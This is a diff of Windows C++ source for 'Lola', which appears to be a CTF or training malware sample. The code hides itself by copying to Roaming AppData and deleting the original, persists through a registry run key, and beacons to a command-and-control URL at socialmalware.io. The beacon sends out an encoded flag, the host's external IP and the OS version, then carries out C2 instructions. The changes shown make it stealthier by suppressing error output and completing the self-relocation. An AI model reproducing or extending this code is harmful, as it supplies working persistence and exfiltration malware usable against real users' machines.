@@ -21,10 +21,10 @@
 
 using namespace std;
 
-#define OS_VERSION_BUFFER_SIZE 100
-#define MAX_URI_BUFFER_SIZE 255
+#define OS_VERSION_BUFFER_SIZE 0x80
+#define MAX_URI_BUFFER_SIZE 0x500
 #define FLAG_LENGTH 35
-#define IP_BUFFER_SIZE 40
+#define IP_BUFFER_SIZE 0x20
 #define XOR_KEY 0x42
 #define MAX_C2_BUFF_SIZE 0x500
 
@@ -35,6 +35,7 @@ char IP[IP_BUFFER_SIZE];
 wchar_t* ROAMINGAPPDATAEXEC = new wchar_t[MAX_PATH];
 wchar_t* ROAMINGAPPDATAPATH = new wchar_t[MAX_PATH];
 const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/L0la.jpg";
+const LPCTSTR USERAGENT = L"L0la-zilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like da l0las :3";
 char* CFG_URI = "https://www.socialmalware.io/static/hsf/cfg.dat";
 char L0LA_IMG_PATH[MAX_PATH];
 char C2_BUFF[MAX_C2_BUFF_SIZE];
@@ -47,22 +48,15 @@ void decrypt(BYTE* flag){
 	}
 }
 
-/* This wont be used */
-void encrypt(BYTE* flag){
-	for(size_t i = 0; flag[i] != 0x0; i++){
-		flag[i] = flag[i] ^ XOR_KEY;
-	}
-}
-
 /* Grab our external IP address from canhazip.com */
 void get_ip()
 {
 	HINTERNET hInternet, hFile;
 	DWORD rsize;
 
-	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	hFile = InternetOpenUrlA(hInternet, "http://canhazip.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
-	InternetReadFile(hFile, &IP, sizeof(IP), &rsize);
+	hInternet = InternetOpen(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hFile = InternetOpenUrlA(hInternet, "https://canhazip.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	InternetReadFile(hFile, &IP, IP_BUFFER_SIZE, &rsize);
 
 	InternetCloseHandle(hFile);
 	InternetCloseHandle(hInternet);
@@ -90,8 +84,16 @@ int hide(const wchar_t* epath){
 	/* Copy the file to Roaming APPDATA */
 	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
 	{
+		/* Tmp vars for file writing */
+		HANDLE hFile;
+		char oldFilePath[MAX_PATH];
+
+		/* For use with Writing/Creating/Deleting the old .exe */
+		wstringstream tmpfilepath;
+		tmpfilepath << ROAMINGAPPDATAPATH << L"\\old_exec" << L'\x00';
+		wstring oldExecFileStore = tmpfilepath.str();
+
 		wstringstream wss;
-		wss.clear();
 		wss << ROAMINGAPPDATAPATH << L"\\lola.exe" << L'\x00';
 		wstring destPath = wss.str();
 		ret = CopyFile(epath, const_cast<LPWSTR>(destPath.c_str()), TRUE);
@@ -102,19 +104,33 @@ int hide(const wchar_t* epath){
 			ROAMINGAPPDATAEXEC[i] = destPath[i];
 		}
 
-		/* TODO: Delete the old file, and transfer execution to the new file.
-		note that this is where the result of CopyFile might come in handy, i.e. if
-		CopyFile returns FALSE, then we continue the other functionality, if it returns
-		TRUE, then we exit after deleting the old file and transfering execution*/
-		if(ret) /* delete the old file */
+		if(!ret)
 		{
-			Sleep(10); // This is here to ensure that the original, spawning process has exited, before we delete.
-			ret = DeleteFile(epath);
+			/* delete the previously running executable */
+			DWORD numbytesread;
+			hFile = CreateFile(const_cast<LPWSTR>(oldExecFileStore.c_str()),GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
+			memset(oldFilePath, 0x0, MAX_PATH);
+			ReadFile(hFile, oldFilePath, MAX_PATH-1, &numbytesread, NULL);
+
+			Sleep(100);
+			
+			ret = DeleteFileA(oldFilePath);
 		}
-
-		sret = ShellExecute( NULL, L"open", const_cast<LPWSTR>(destPath.c_str()), NULL, NULL, 0 );
-
-
+		else
+		{
+			/* Create and write our current execution path to a file alongside the new file we'll execute */
+			size_t r = 0;
+			DWORD written;
+			hFile = CreateFile(const_cast<LPWSTR>(oldExecFileStore.c_str()),GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
+			char mb_epath[MAX_PATH];
+			memset(mb_epath, 0x0, MAX_PATH);
+			wcstombs_s(&r, mb_epath, MAX_PATH, epath, MAX_PATH);
+			mb_epath[MAX_PATH-1] = '\x0';
+			WriteFile(hFile, mb_epath, MAX_PATH, &written, NULL);
+			CloseHandle(hFile);
+			sret = ShellExecute( NULL, L"open", const_cast<LPWSTR>(destPath.c_str()), NULL, NULL, 0 );
+			exit(0);
+		}
 		return EXIT_SUCCESS;
 	}
 	else
@@ -135,7 +151,6 @@ int persist()
 
 	const size_t count = MAX_PATH*2;
 	wchar_t szValue[count] = {};
-	memset(ROAMINGAPPDATAEXEC, 0x0, MAX_PATH);
 
 	wcscpy_s(szValue, count, L"\"");
 	wcscat_s(szValue, count, ROAMINGAPPDATAEXEC);
@@ -153,7 +168,6 @@ int persist()
 	}
 	else
 	{
-		cerr << "[-] Error creating registry key!" << endl;
 		return EXIT_FAILURE;
 	}
 
@@ -193,7 +207,7 @@ int beacon()
 		// Buffer for the encoded OS Version information
 		LPSTR os_ver_encoded;
 		char ver_info[OS_VERSION_BUFFER_SIZE];
-		BYTE ver_infob[OS_VERSION_BUFFER_SIZE];
+		
 		OSVERSIONINFO osvi;
 
 		// Used to convert wide/narrow strings in Windows. Destination path for file download.
@@ -209,30 +223,33 @@ int beacon()
 		memset(uri, 0x0, MAX_URI_BUFFER_SIZE);
 		memset(IPb, 0x0, IP_BUFFER_SIZE);
 		memset(ver_info, 0x0, OS_VERSION_BUFFER_SIZE);
-		memset(ver_infob, 0x0, OS_VERSION_BUFFER_SIZE);
+		
 
 		/* Decrypt the flag */
 		decrypt(FLAG);
-		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, NULL, &len);
+		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
 		flagbuff_encoded = (LPSTR)malloc(len); // b64 container for the flag
-		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, flagbuff_encoded, &len);
+		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, flagbuff_encoded, &len);
 
 		/* Get the OS Version, we'll send the major and minor values */
 		GetVersionEx(&osvi);
-		sprintf_s(ver_info, OS_VERSION_BUFFER_SIZE, "M:%d_m:%d_B:%d_P:%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId);
-		for(int i = 0; i < OS_VERSION_BUFFER_SIZE; i++)
+		ret = sprintf_s(ver_info, OS_VERSION_BUFFER_SIZE, "M:%d_m:%d_B:%d_P:%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId);
+		BYTE* ver_infob = (BYTE*)malloc(strlen(ver_info));
+		memset(ver_infob, 0x0, sizeof(ver_infob));
+		for(size_t i = 0; i < strlen(ver_info); i++)
 			ver_infob[i] = ver_info[i];
-		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
+		ver_infob[strlen(ver_info)] = 0x0;
+		cryptRet = CryptBinaryToStringA(ver_infob, strlen(ver_info), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
 		os_ver_encoded = (LPSTR)malloc(len);
-		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, os_ver_encoded, &len);
+		cryptRet = CryptBinaryToStringA(ver_infob, strlen(ver_info), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, os_ver_encoded, &len);
 
 		/* Get the external IP address */
 		get_ip();
-		for(int i = 0; i < IP_BUFFER_SIZE; i++)
+		for(size_t i = 0; i < IP_BUFFER_SIZE; i++)
 			IPb[i] = IP[i];
-		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
+		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
 		ipbuff_encoded = (LPSTR)malloc(len);
-		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, ipbuff_encoded, &len);
+		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, ipbuff_encoded, &len);
 
 		/* Setup the destination path for the download */
 		wss << ROAMINGAPPDATAPATH << L"\\lola.jpg";
@@ -245,10 +262,14 @@ int beacon()
 
 
 		/* Construct the full URI.  This will exfill the data, and get additional information*/
-		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 		// flag beacon: uri?ex=<b64 flag>&ip=<b64 ip>&ver=<b64 of OS info>
-		sprintf_s(uri, MAX_URI_BUFFER_SIZE, "%S?ex=%S&ip=%S&ver=%S", CFG_URI, flagbuff_encoded, ipbuff_encoded, os_ver_encoded);
+		ret = sprintf_s(uri, MAX_URI_BUFFER_SIZE, "%s?ex=%s&ip=%s&ver=%s", CFG_URI, flagbuff_encoded, ipbuff_encoded, os_ver_encoded);
+		hInternet = InternetOpen(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 		hFile = InternetOpenUrlA(hInternet, uri, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+		if(hFile == NULL)
+		{
+			//cerr << "[-] There was an error opening the URI: "  << GetLastError() << endl;
+		}
 		InternetReadFile(hFile, &C2_BUFF, MAX_C2_BUFF_SIZE, &rsize);
 		C2_BUFF[rsize] = '\x0'; // ensure that we null terminate the values read :P
 
@@ -276,35 +297,20 @@ int main(int argc, char* argv[]){
 
 	memset(execPath, 0x0, sizeof(execPath));
 
-	cout << argv[0] << endl;
-
 	mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P
 
 	/* Hide */
-
-	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
+	if( hide(execPath) == EXIT_FAILURE )
 	{
-		/* If the program is executing out of APP data, then it's likely we've already infected this host.
-		Skip the Hiding process, and continue on */
-		// TODO: Change this to install/check for a mutex. This is a more elegant solution to prevent reinfection
-		char roaming_app_tmp[MAX_PATH];
-		wcstombs_s(&ret, roaming_app_tmp, ROAMINGAPPDATAPATH, MAX_PATH);
-		if(strstr(argv[0], roaming_app_tmp) == NULL)
-		{
-			if( hide(execPath) == EXIT_FAILURE )
-			{
-				/* Unable to copy exe to APPDATA */
-				cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
-				return EXIT_FAILURE;
-			}
-		}
+		/* Unable to copy exe to APPDATA */
+		//cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
+		return EXIT_FAILURE;
 	}
-
 
 	/* Persist */
 	if( persist() )
 	{
-		cerr << "[-] Lola wasn't able to persist!" << endl;
+		//cerr << "[-] Lola wasn't able to persist!" << endl;
 		return EXIT_FAILURE;
 	}
 
@@ -312,8 +318,7 @@ int main(int argc, char* argv[]){
 	{
 		/* Ask C2 what to do next */
 		c2comm = beacon();
-		// TODO: Wrap this in a while(true) loop that just continuously beacons
-
+		
 		if(c2comm == EXIT_SUCCESS)
 		{
 			BYTE instruction = C2_BUFF[0];
@@ -323,10 +328,10 @@ int main(int argc, char* argv[]){
 			actions. */
 			switch(instruction)
 			{
-			case 0x1:
-				Sleep(1000); // For testing
-				//Sleep(120000); // For prod
+			case 0x31:
+
 				ShellExecuteA(0, 0, L0LA_IMG_PATH, 0, 0 , SW_SHOW );
+				Sleep(20000);
 				break;
 
 			default:
@@ -339,7 +344,7 @@ int main(int argc, char* argv[]){
 			Sleep(300000);
 		}
 
-		// There's currently a memory leak :P
+		// There's currently a, nay, many, memory leaks :P
 		//delete ROAMINGAPPDATAEXEC;
 		//delete ROAMINGAPPDATAPATH;
 	}
